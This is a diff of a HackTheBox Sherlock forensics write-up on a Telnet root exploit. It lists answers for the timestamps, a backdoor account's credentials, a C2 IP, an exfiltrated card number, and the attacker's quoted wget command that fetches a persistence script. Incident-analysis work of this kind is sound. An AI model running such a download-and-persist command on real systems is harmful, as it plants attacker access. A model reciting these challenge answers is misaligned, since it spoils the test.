@@ -1,6 +1,6 @@
 # Telly - HackTheBox Sherlock Writeup
 
-![Banner](../banner.PNG)
+![Banner](./banner.PNG)
 
 ---
 
@@ -40,7 +40,7 @@ Through this challenge, I gained hands-on experience in:
 ### Question 1: CVE Identification
 **What CVE is associated with the vulnerability exploited in the Telnet protocol?**
 
-![CVE Browsed](../cves_browsed.PNG)
+![CVE Browsed](./cves_browsed.PNG)
 
 **Answer:** `CVE-2026-24061`
 
@@ -51,20 +51,20 @@ Through this challenge, I gained hands-on experience in:
 ### Question 2: Exploitation Timestamp
 **When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?**
 
-![Timestamp](../for_the_time_stamp.PNG)
+![Timestamp](./for_the_time_stamp.PNG)
 
 **Answer:** `2026-01-27 10:39:28`
 
 **Explanation:** By examining the Wireshark capture and filtering for Telnet traffic, we identified the exact timestamp when the exploitation occurred. The arrival time in the packet capture shows: `Jan 27, 2026 16:09:28.319357980 India Standard Time`, which converts to `2026-01-27 10:39:28` UTC.
 
-![Wireshark Telnet Output](../whireshark_output_for_telnet.PNG)
+![Wireshark Telnet Output](./whireshark_output_for_telnet.PNG)
 
 ---
 
 ### Question 3: Target Hostname
 **What is the hostname of the targeted server?**
 
-![Hostname](../for_the_hostname.PNG)
+![Hostname](./for_the_hostname.PNG)
 
 **Answer:** `backup-secondary`
 
@@ -75,7 +75,7 @@ Through this challenge, I gained hands-on experience in:
 ### Question 4: Backdoor Account Creation
 **The attacker created a backdoor account to maintain future access. What username and password were set for that account?**
 
-![Add New User](../add_new_user_for_the_backdoor.PNG)
+![Add New User](./add_new_user_for_the_backdoor.PNG)
 
 **Answer:** `cleanupsvc:YouKnowWhoiam69`
 
@@ -90,7 +90,7 @@ This created a user named "cleanupsvc" with the password "YouKnowWhoiam69" to ma
 ### Question 5: Persistence Script Download
 **What was the full command the attacker used to download the persistence script?**
 
-![Linpeas Download](../linpeas_file_download_using_wget.PNG)
+![Linpeas Download](./linpeas_file_download_using_wget.PNG)
 
 **Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`
 
@@ -101,7 +101,7 @@ This created a user named "cleanupsvc" with the password "YouKnowWhoiam69" to ma
 ### Question 6: C2 IP Address
 **The attacker installed remote access persistence using the persistence script. What is the C2 IP address?**
 
-![C2 IP Address](../for_c2_ip_address.PNG)
+![C2 IP Address](./for_c2_ip_address.PNG)
 
 **Answer:** `91.99.25.54`
 
@@ -112,7 +112,7 @@ This created a user named "cleanupsvc" with the password "YouKnowWhoiam69" to ma
 ### Question 7: Data Exfiltration Timestamp
 **The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?**
 
-![Exfiltration](../exflitration_sensitive_file.PNG)
+![Exfiltration](./exflitration_sensitive_file.PNG)
 
 **Answer:** `2026-01-27 10:49:54`
 
@@ -127,7 +127,7 @@ The attacker successfully exfiltrated the `credit-cards-25-blackfriday.db` file 
 ### Question 8: Credit Card Data Analysis
 **Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.**
 
-![Credit Card Details](../creditial_card_details.PNG)
+![Credit Card Details](./creditial_card_details.PNG)
 
 **Answer:** `5312269047781209`
 
@@ -195,3 +195,4 @@ The skills gained from this challenge are directly applicable to real-world SOC 
 **Author:** Saurabh Tomar  
 **Date:** 2026  
 **Platform:** HackTheBox Sherlock
+
